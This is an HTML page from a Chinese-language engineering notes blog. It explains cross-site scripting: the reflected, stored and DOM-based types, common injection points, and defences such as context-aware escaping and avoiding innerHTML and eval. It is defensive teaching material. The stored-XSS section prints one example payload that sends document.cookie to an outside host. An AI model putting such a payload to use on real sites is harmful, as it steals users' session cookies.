@@ -1,0 +1,249 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>XSS攻击｜安全与堡垒机 / 高级安全｜BEN.OPS</title>
+  <meta name="description" content="XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。">
+  <meta name="keywords" content="安全与堡垒机，高级安全，Java，XSS，漏洞，知识笔记，安全与堡垒机 / 高级安全，XSS攻击">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E9%AB%98%E7%BA%A7%E5%AE%89%E5%85%A8%2BJava%2BXSS-XSS%E6%94%BB%E5%87%BB.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="XSS攻击">
+  <meta property="og:description" content="XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html">
+  <meta property="article:published_time" content="2023-04-14T15:57:00">
+  <meta property="article:modified_time" content="2023-04-14 15:57">
+  <meta property="article:section" content="安全与堡垒机 / 高级安全">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="XSS攻击">
+  <meta name="twitter:description" content="XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html#article","headline":"XSS攻击","description":"XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。","datePublished":"2023-04-14T15:57:00","dateModified":"2023-04-14 15:57","inLanguage":"zh-CN","articleSection":["安全与堡垒机","高级安全"],"keywords":["安全与堡垒机","高级安全","Java","XSS","漏洞","知识笔记","安全与堡垒机 / 高级安全","XSS攻击"],"wordCount":3203,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"安全与堡垒机 / 高级安全","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"XSS攻击","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>安全与堡垒机 / 高级安全</span> › <span>XSS攻击</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">安全与堡垒机 / 高级安全</div>
+      <h1>XSS攻击</h1>
+      <p class="lede">XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T15:57:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">3,203 字</span>
+        <span class="badge">10 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="什么是XSS攻击">什么是XSS攻击</h2>
+<p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>
+<p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。XSS 的重点不在于跨站点，而在于脚本的执行。</p>
+<h2 id="XSS本质">XSS本质</h2>
+<p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p>
+<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p>
+<h2 id="XSS分类">XSS分类</h2>
+<p>XSS 攻击最主要有如下分类：反射型、存储型、及 DOM-based 型。 反射性和 DOM-baseed 型可以归类为非持久性 XSS 攻击。存储型可以归类为持久性 XSS 攻击。</p>
+<h3 id="反射型XSS">反射型XSS</h3>
+<p>反射性 XSS 的原理是：反射性 xss 一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的 URL。当受害者点击恶意链接 url 的时候，恶意代码会直接在受害者的主机上的浏览器执行。</p>
+<p>反射性 XSS 又可以叫做非持久性 XSS。为什么叫反射型 XSS 呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性 XSS 呢？那是因为这种攻击方式只有一次性。</p>
+<p>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 “反射” 到受害者的浏览器上，从而浏览器就执行了该脚本。</p>
+<p>因此反射型 XSS 的攻击步骤如下：</p>
+<ol>
+<li>攻击者在 url 后面的参数中加入恶意攻击代码。</li>
+<li>当用户打开带有恶意代码的 URL 的时候，网站服务端将恶意代码从 URL 中取出，拼接在 html 中并且返回给浏览器端。</li>
+<li>用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。</li>
+<li>攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如 cookie 等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</li>
+</ol>
+<h3 id="存储型XSS">存储型XSS</h3>
+<p>存储型 XSS 的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p>
+<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：</p>
+<p><code>&lt;script&gt;window.open("www.haicoder.net?param="+document.cookie)&lt;/script&gt;</code></p>
+<p>如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的 cookie，然后会把 cookie 发送到攻击者的服务器上了。</p>
+<p>因此存储型 XSS 的攻击步骤如下：</p>
+<ol>
+<li>攻击者将恶意代码提交到目标网站数据库中。</li>
+<li>用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到 html 中返回给浏览器中。</li>
+<li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
+<li>那么恶意代码执行后，就能获取到用户数据，比如上面的 cookie 等信息，那么把该 cookie 发送到攻击者网站中，那么攻击者拿到该 cookie 然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
+</ol>
+<p>如何防范？</p>
+<ol>
+<li>后端需要对提交的数据进行过滤。</li>
+<li>前端也可以做一下处理方式，比如对 script 标签，将特殊字符替换成 HTML 编码这些等。</li>
+</ol>
+<h3 id="DOM-based型XSS">DOM-based型XSS</h3>
+<p>我们客户端的 <strong>js</strong> 可以对页面 dom 节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从 URL 中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的 js 脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到 DOM-based XSS 的攻击。因此 DOM 型 XSS 的攻击步骤如下：</p>
+<ol>
+<li>攻击者构造出特殊的 URL、在其中可能包含恶意代码。</li>
+<li>用户打开带有恶意代码的 URL。</li>
+<li>用户浏览器收到响应后解析执行。前端使用 js 取出 url 中的恶意代码并执行。</li>
+<li>执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。</li>
+</ol>
+<p>DOM XSS 是基于文档对象模型的 XSS。一般有如下 DOM 操作：</p>
+<ol>
+<li>使用 document.write 直接输出数据。</li>
+<li>使用 innerHTML 直接输出数据。</li>
+<li>使用 location、location.href、location.replace、iframe.src、document.referer、<a href="http://window.name" rel="noopener noreferrer">window.name</a> 等这些。</li>
+</ol>
+<h2 id="XSS攻击常用方法">XSS攻击常用方法</h2>
+<ol>
+<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
+<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
+<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
+<li>在标签的 href、src 等属性中，包含 javascript: 等可执行代码。</li>
+<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
+<li>在 style 属性和标签中，包含类似 background-image:url(“javascript:…”); 的代码（新版本浏览器已经可以防范）。</li>
+<li>在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
+</ol>
+<p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p>
+<h2 id="XSS攻击预防">XSS攻击预防</h2>
+<p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p>
+<ol>
+<li>攻击者提交恶意代码。</li>
+<li>浏览器执行恶意代码。</li>
+</ol>
+<p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p>
+<h3 id="输入过滤">输入过滤</h3>
+<p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 “安全的” 内容，返回给前端。这样是否可行呢？</p>
+<p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &amp;lt; 7</code>。问题是：在提交阶段，我们并不确定内容要输出到哪里。这里的 “并不确定内容要输出到哪里” 有两层含义：</p>
+<ol>
+<li>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( <code>5 &amp;lt; 7</code>)。</li>
+<li>在前端中，不同的位置所需的编码也不同。当 <code>5 &amp;lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</li>
+</ol>
+<p><code>&lt;div title="comment"&gt;5 &amp;lt; 7&lt;/div&gt;</code></p>
+<p>当 <code>5 &amp;lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 <strong>Vue</strong> 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</p>
+<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p>
+<p>既然输入过滤并非完全可靠，我们就要通过 “防止浏览器执行恶意代码” 来防范 XSS。这部分分为两类：</p>
+<ol>
+<li>防止 HTML 中出现注入。</li>
+<li>防止 JavaScript 执行时，执行恶意代码。</li>
+</ol>
+<h2 id="预防存储型和反射型XSS攻击">预防存储型和反射型XSS攻击</h2>
+<p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的 “数据” 被内嵌到 “代码” 中，被浏览器所执行。预防这两种漏洞，有两种常见做法：</p>
+<ol>
+<li>改成纯前端渲染，把代码和数据分隔开。</li>
+<li>对 HTML 做充分转义。</li>
+</ol>
+<h3 id="纯前端渲染">纯前端渲染</h3>
+<p>纯前端渲染的过程：</p>
+<ol>
+<li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li>
+<li>然后浏览器执行 HTML 中的 JavaScript。</li>
+<li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li>
+</ol>
+<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p>
+<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文 ”预防 DOM 型 XSS 攻击“ 部分）。</p>
+<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p>
+<h3 id="转义HTML">转义HTML</h3>
+<p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>
+<p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; " ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>
+<p><code>|XSS 安全漏洞|简单转义是否有防护作用| |-|-| |HTML 标签文字内容|有| |HTML 属性值|有| |CSS 内联样式|无| |内联 JavaScript|无| |内联 JSON|无| |跳转链接|无|</code></p>
+<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p>
+<h2 id="预防DOM型XSS攻击">预防DOM型XSS攻击</h2>
+<p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>
+<p>在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。</p>
+<p>如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。</p>
+<p>DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>
+<h2 id="XSS攻击总结">XSS攻击总结</h2>
+<p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>
+<p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。XSS 的重点不在于跨站点，而在于脚本的执行。</p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#什么是XSS攻击">什么是XSS攻击</a></li><li style="margin-left:0.0rem"><a href="#XSS本质">XSS本质</a></li><li style="margin-left:0.0rem"><a href="#XSS分类">XSS分类</a></li><li style="margin-left:0.8rem"><a href="#反射型XSS">反射型XSS</a></li><li style="margin-left:0.8rem"><a href="#存储型XSS">存储型XSS</a></li><li style="margin-left:0.8rem"><a href="#DOM-based型XSS">DOM-based型XSS</a></li><li style="margin-left:0.0rem"><a href="#XSS攻击常用方法">XSS攻击常用方法</a></li><li style="margin-left:0.0rem"><a href="#XSS攻击预防">XSS攻击预防</a></li><li style="margin-left:0.8rem"><a href="#输入过滤">输入过滤</a></li><li style="margin-left:0.0rem"><a href="#预防存储型和反射型XSS攻击">预防存储型和反射型XSS攻击</a></li><li style="margin-left:0.8rem"><a href="#纯前端渲染">纯前端渲染</a></li><li style="margin-left:0.8rem"><a href="#转义HTML">转义HTML</a></li><li style="margin-left:0.0rem"><a href="#预防DOM型XSS攻击">预防DOM型XSS攻击</a></li><li style="margin-left:0.0rem"><a href="#XSS攻击总结">XSS攻击总结</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：安全与堡垒机 / 高级安全</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">安全与堡垒机</span><span class="tag">高级安全</span><span class="tag">Java</span><span class="tag">XSS</span><span class="tag">漏洞</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：03-安全运营与应急/07-工作运维离线知识库/05-拓展/birdben/68657540.html</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E9%AB%98%E7%BA%A7%E5%AE%89%E5%85%A8%2BJava%2BXSS-XSS%E6%94%BB%E5%87%BB.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>XSS攻击。本文属于安全与堡垒机 / 高级安全，Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>
+      <p>关键词：安全与堡垒机、高级安全、Java、XSS、漏洞、知识笔记、安全与堡垒机 / 高级安全、XSS攻击</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-111b99ec6bec.html"><small>上一篇</small>XSS 跨窗口劫持演示+原理讲解</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c45fa6bd3c55.html"><small>下一篇</small>Zabbix监控K8S</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-05484c967ca3.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
